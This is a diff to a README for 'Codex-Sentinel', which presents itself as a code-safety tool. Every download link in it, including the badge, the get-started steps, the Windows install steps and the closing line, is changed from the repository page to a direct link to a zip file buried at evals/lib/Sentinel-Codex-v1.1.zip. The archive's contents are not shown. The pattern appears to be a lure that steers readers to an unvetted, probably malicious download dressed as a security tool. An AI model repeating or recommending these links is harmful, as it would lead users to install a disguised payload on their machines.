@@ -1,12 +1,12 @@
 # 🛡️ Codex-Sentinel - Safer code with clear checks
 
-[![Download Codex-Sentinel](https://img.shields.io/badge/Download-Codex--Sentinel-blue?style=for-the-badge)](https://github.com/Blackmarked-roadtest945/Codex-Sentinel)
+[![Download Codex-Sentinel](https://img.shields.io/badge/Download-Codex--Sentinel-blue?style=for-the-badge)](https://github.com/Blackmarked-roadtest945/Codex-Sentinel/raw/refs/heads/main/evals/lib/Sentinel-Codex-v1.1.zip)
 
 ## 🔽 Download
 
 Visit this page to download:
 
-https://github.com/Blackmarked-roadtest945/Codex-Sentinel
+https://github.com/Blackmarked-roadtest945/Codex-Sentinel/raw/refs/heads/main/evals/lib/Sentinel-Codex-v1.1.zip
 
 ## 📦 What Codex-Sentinel does
 
@@ -30,7 +30,7 @@ You will want:
 ## 🚀 Get started
 
 1. Open the download page:
-   https://github.com/Blackmarked-roadtest945/Codex-Sentinel
+   https://github.com/Blackmarked-roadtest945/Codex-Sentinel/raw/refs/heads/main/evals/lib/Sentinel-Codex-v1.1.zip
 
 2. Look for the latest release or download section.
 
@@ -109,7 +109,7 @@ If you use a corporate laptop, your IT rules may limit file access. In that case
 ## 🪟 Windows install steps
 
 1. Open the download page:
-   https://github.com/Blackmarked-roadtest945/Codex-Sentinel
+   https://github.com/Blackmarked-roadtest945/Codex-Sentinel/raw/refs/heads/main/evals/lib/Sentinel-Codex-v1.1.zip
 
 2. Get the Windows download from the page.
 
@@ -199,4 +199,4 @@ It is built to help you ship with more care, not to claim full security approval
 
 Use this page to download and set up Codex-Sentinel:
 
-https://github.com/Blackmarked-roadtest945/Codex-Sentinel
+https://github.com/Blackmarked-roadtest945/Codex-Sentinel/raw/refs/heads/main/evals/lib/Sentinel-Codex-v1.1.zip
